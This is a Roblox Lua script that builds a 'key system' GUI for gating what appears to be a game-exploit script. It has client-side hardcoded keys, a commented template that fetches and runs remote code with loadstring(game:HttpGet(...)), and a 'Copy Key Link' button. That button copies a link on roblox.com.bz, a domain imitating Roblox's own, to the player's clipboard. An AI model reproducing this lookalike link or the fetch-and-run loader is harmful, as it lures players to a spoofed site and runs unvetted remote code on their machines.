-- Key System GUI
-- Paste this at the top of your script

local KeySystem = {}

-- ╔══════════════════════════════╗
-- ║  CHANGE YOUR LINK HERE       ║
-- ╚══════════════════════════════╝
KeySystem.GetKeyLink = "https://roblox.com.bz/communities/9834870871/"

-- Valid keys (add/remove as needed)
local ValidKeys = {
    "DEMO-1234-ABCD-5678",
    "TEST-KEY1-XXXX-9999",
}

-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeySystem"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

-- Background blur
local BlurFrame = Instance.new("Frame")
BlurFrame.Size = UDim2.new(1, 0, 1, 0)
BlurFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
BlurFrame.BackgroundTransparency = 0.3
BlurFrame.BorderSizePixel = 0
BlurFrame.ZIndex = 1
BlurFrame.Parent = ScreenGui

-- Main window
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 420, 0, 0)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(13, 13, 15)
MainFrame.BorderSizePixel = 0
MainFrame.ZIndex = 2
MainFrame.Parent = ScreenGui
MainFrame.AutomaticSize = Enum.AutomaticSize.Y

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 12)
Corner.Parent = MainFrame

local Stroke = Instance.new("UIStroke")
Stroke.Color = Color3.fromRGB(42, 42, 58)
Stroke.Thickness = 1
Stroke.Parent = MainFrame

-- Title bar
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 44)
TitleBar.BackgroundColor3 = Color3.fromRGB(19, 19, 26)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 3
TitleBar.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 12)
TitleCorner.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "KEY SYSTEM  —  v1.0"
TitleLabel.TextColor3 = Color3.fromRGB(74, 74, 106)
TitleLabel.Font = Enum.Font.Code
TitleLabel.TextSize = 11
TitleLabel.ZIndex = 4
TitleLabel.Parent = TitleBar

-- Body layout
local Body = Instance.new("Frame")
Body.Size = UDim2.new(1, -48, 0, 0)
Body.AutomaticSize = Enum.AutomaticSize.Y
Body.Position = UDim2.new(0, 24, 0, 56)
Body.BackgroundTransparency = 1
Body.ZIndex = 3
Body.Parent = MainFrame

local BodyLayout = Instance.new("UIListLayout")
BodyLayout.Padding = UDim.new(0, 12)
BodyLayout.SortOrder = Enum.SortOrder.LayoutOrder
BodyLayout.Parent = Body

-- Logo badge
local LogoBadge = Instance.new("Frame")
LogoBadge.Size = UDim2.new(1, 0, 0, 52)
LogoBadge.BackgroundColor3 = Color3.fromRGB(26, 26, 46)
LogoBadge.BorderSizePixel = 0
LogoBadge.LayoutOrder = 1
LogoBadge.Parent = Body

local LogoCorner = Instance.new("UICorner")
LogoCorner.CornerRadius = UDim.new(0, 8)
LogoCorner.Parent = LogoBadge

local LogoBadgeStroke = Instance.new("UIStroke")
LogoBadgeStroke.Color = Color3.fromRGB(42, 42, 74)
LogoBadgeStroke.Thickness = 1
LogoBadgeStroke.Parent = LogoBadge

local LogoTitle = Instance.new("TextLabel")
LogoTitle.Size = UDim2.new(1, 0, 0.55, 0)
LogoTitle.Position = UDim2.new(0, 0, 0.05, 0)
LogoTitle.BackgroundTransparency = 1
LogoTitle.Text = "SCRIPT LOADER"
LogoTitle.TextColor3 = Color3.fromRGB(224, 222, 255)
LogoTitle.Font = Enum.Font.Code
LogoTitle.TextSize = 15
LogoTitle.FontFace = Font.new("rbxasset://fonts/families/RobotoMono.json", Enum.FontWeight.Bold)
LogoTitle.ZIndex = 4
LogoTitle.Parent = LogoBadge

local LogoSub = Instance.new("TextLabel")
LogoSub.Size = UDim2.new(1, 0, 0.35, 0)
LogoSub.Position = UDim2.new(0, 0, 0.6, 0)
LogoSub.BackgroundTransparency = 1
LogoSub.Text = "Protected by KeyGuard"
LogoSub.TextColor3 = Color3.fromRGB(74, 74, 106)
LogoSub.Font = Enum.Font.Code
LogoSub.TextSize = 10
LogoSub.ZIndex = 4
LogoSub.Parent = LogoBadge

-- Key input label
local KeyLabel = Instance.new("TextLabel")
KeyLabel.Size = UDim2.new(1, 0, 0, 16)
KeyLabel.BackgroundTransparency = 1
KeyLabel.Text = "ACCESS KEY"
KeyLabel.TextColor3 = Color3.fromRGB(74, 74, 106)
KeyLabel.Font = Enum.Font.Code
KeyLabel.TextSize = 10
KeyLabel.TextXAlignment = Enum.TextXAlignment.Left
KeyLabel.LayoutOrder = 2
KeyLabel.ZIndex = 3
KeyLabel.Parent = Body

-- Key input box
local KeyInput = Instance.new("TextBox")
KeyInput.Size = UDim2.new(1, 0, 0, 40)
KeyInput.BackgroundColor3 = Color3.fromRGB(10, 10, 16)
KeyInput.BorderSizePixel = 0
KeyInput.PlaceholderText = "XXXX-XXXX-XXXX-XXXX"
KeyInput.PlaceholderColor3 = Color3.fromRGB(42, 42, 58)
KeyInput.TextColor3 = Color3.fromRGB(124, 106, 247)
KeyInput.Font = Enum.Font.Code
KeyInput.TextSize = 13
KeyInput.ClearTextOnFocus = false
KeyInput.LayoutOrder = 3
KeyInput.ZIndex = 3
KeyInput.Parent = Body

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 8)
InputCorner.Parent = KeyInput

local InputStroke = Instance.new("UIStroke")
InputStroke.Color = Color3.fromRGB(42, 42, 58)
InputStroke.Thickness = 1
InputStroke.Parent = KeyInput

-- Verify button
local VerifyBtn = Instance.new("TextButton")
VerifyBtn.Size = UDim2.new(1, 0, 0, 40)
VerifyBtn.BackgroundColor3 = Color3.fromRGB(124, 106, 247)
VerifyBtn.BorderSizePixel = 0
VerifyBtn.Text = "▶  VERIFY KEY"
VerifyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
VerifyBtn.Font = Enum.Font.Code
VerifyBtn.TextSize = 13
VerifyBtn.LayoutOrder = 4
VerifyBtn.ZIndex = 3
VerifyBtn.Parent = Body

local VerifyCorner = Instance.new("UICorner")
VerifyCorner.CornerRadius = UDim.new(0, 8)
VerifyCorner.Parent = VerifyBtn

-- Status bar
local StatusBar = Instance.new("Frame")
StatusBar.Size = UDim2.new(1, 0, 0, 40)
StatusBar.BackgroundColor3 = Color3.fromRGB(10, 10, 16)
StatusBar.BorderSizePixel = 0
StatusBar.LayoutOrder = 5
StatusBar.ZIndex = 3
StatusBar.Parent = Body

local StatusCorner = Instance.new("UICorner")
StatusCorner.CornerRadius = UDim.new(0, 8)
StatusCorner.Parent = StatusBar

local StatusStroke = Instance.new("UIStroke")
StatusStroke.Color = Color3.fromRGB(30, 30, 46)
StatusStroke.Thickness = 1
StatusStroke.Parent = StatusBar

local StatusText = Instance.new("TextLabel")
StatusText.Size = UDim2.new(1, -16, 1, 0)
StatusText.Position = UDim2.new(0, 16, 0, 0)
StatusText.BackgroundTransparency = 1
StatusText.Text = "Awaiting key input…"
StatusText.TextColor3 = Color3.fromRGB(58, 58, 90)
StatusText.Font = Enum.Font.Code
StatusText.TextSize = 11
StatusText.TextXAlignment = Enum.TextXAlignment.Left
StatusText.ZIndex = 4
StatusText.Parent = StatusBar

-- Divider
local Divider = Instance.new("Frame")
Divider.Size = UDim2.new(1, 0, 0, 1)
Divider.BackgroundColor3 = Color3.fromRGB(26, 26, 46)
Divider.BorderSizePixel = 0
Divider.LayoutOrder = 6
Divider.Parent = Body

-- Get Key link label
local LinkLabel = Instance.new("TextLabel")
LinkLabel.Size = UDim2.new(1, 0, 0, 16)
LinkLabel.BackgroundTransparency = 1
LinkLabel.Text = "GET KEY LINK"
LinkLabel.TextColor3 = Color3.fromRGB(74, 74, 106)
LinkLabel.Font = Enum.Font.Code
LinkLabel.TextSize = 10
LinkLabel.TextXAlignment = Enum.TextXAlignment.Left
LinkLabel.LayoutOrder = 7
LinkLabel.ZIndex = 3
LinkLabel.Parent = Body

-- Copy link button
local CopyLinkBtn = Instance.new("TextButton")
CopyLinkBtn.Size = UDim2.new(1, 0, 0, 40)
CopyLinkBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 46)
CopyLinkBtn.BorderSizePixel = 0
CopyLinkBtn.Text = "⎘  Copy Key Link"
CopyLinkBtn.TextColor3 = Color3.fromRGB(74, 138, 122)
CopyLinkBtn.Font = Enum.Font.Code
CopyLinkBtn.TextSize = 12
CopyLinkBtn.LayoutOrder = 8
CopyLinkBtn.ZIndex = 3
CopyLinkBtn.Parent = Body

local CopyCorner = Instance.new("UICorner")
CopyCorner.CornerRadius = UDim.new(0, 8)
CopyCorner.Parent = CopyLinkBtn

local CopyStroke = Instance.new("UIStroke")
CopyStroke.Color = Color3.fromRGB(30, 30, 46)
CopyStroke.Thickness = 1
CopyStroke.Parent = CopyLinkBtn

-- Footer padding
local FooterPad = Instance.new("Frame")
FooterPad.Size = UDim2.new(1, 0, 0, 8)
FooterPad.BackgroundTransparency = 1
FooterPad.LayoutOrder = 9
FooterPad.Parent = Body

-- ════════════════════════════════
--  LOGIC
-- ════════════════════════════════

local function setStatus(text, color)
    StatusText.Text = text
    StatusText.TextColor3 = color
end

local function isValidKey(key)
    for _, v in ipairs(ValidKeys) do
        if v == key:upper():gsub("%s", "") then
            return true
        end
    end
    return false
end

VerifyBtn.MouseButton1Click:Connect(function()
    local key = KeyInput.Text
    if key == "" then
        setStatus("✗  Please enter a key first", Color3.fromRGB(255, 95, 87))
        return
    end
    setStatus("⏳  Verifying key…", Color3.fromRGB(254, 188, 46))
    task.wait(1.2)
    if isValidKey(key) then
        setStatus("✓  Key verified — access granted", Color3.fromRGB(40, 200, 64))
        task.wait(1)
        -- ╔══════════════════════════════╗
        -- ║  YOUR SCRIPT RUNS HERE       ║
        -- ╚══════════════════════════════╝
        ScreenGui:Destroy()
        -- loadstring(game:HttpGet("YOUR_SCRIPT_URL"))()
    else
        setStatus("✗  Invalid key — access denied", Color3.fromRGB(255, 95, 87))
    end
end)

CopyLinkBtn.MouseButton1Click:Connect(function()
    setclipboard(KeySystem.GetKeyLink)
    CopyLinkBtn.Text = "✓  Link Copied!"
    CopyLinkBtn.TextColor3 = Color3.fromRGB(40, 200, 64)
    task.wait(2)
    CopyLinkBtn.Text = "⎘  Copy Key Link"
    CopyLinkBtn.TextColor3 = Color3.fromRGB(74, 138, 122)
end)

-- Hover effects
VerifyBtn.MouseEnter:Connect(function()
    TweenService:Create(VerifyBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(147, 128, 255)}):Play()
end)
VerifyBtn.MouseLeave:Connect(function()
    TweenService:Create(VerifyBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(124, 106, 247)}):Play()
end)